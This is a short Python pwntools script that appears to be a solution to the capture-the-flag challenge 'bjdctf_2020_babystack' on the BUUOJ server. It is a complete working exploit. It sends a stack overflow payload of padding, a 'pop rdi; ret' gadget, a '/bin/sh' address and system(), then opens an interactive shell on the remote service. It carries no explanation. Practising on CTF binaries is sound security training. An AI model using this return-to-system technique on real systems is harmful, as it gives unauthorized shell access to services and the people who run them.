from pwn import *


pop_rdi_ret = 0x00400833
binsh = 0x00400858
system = 0x00400590

conn = remote('node4.buuoj.cn', 27299)
#conn = process('./bjdctf_2020_babystack')

conn.recvuntil(b'your name:\n')
conn.sendline(b'64')

payload = b'a'* (0x10 + 0x8)
payload += p64(pop_rdi_ret) + p64(binsh)
payload += p64(system)

conn.sendlineafter(b'u name?\n', payload)
conn.interactive()
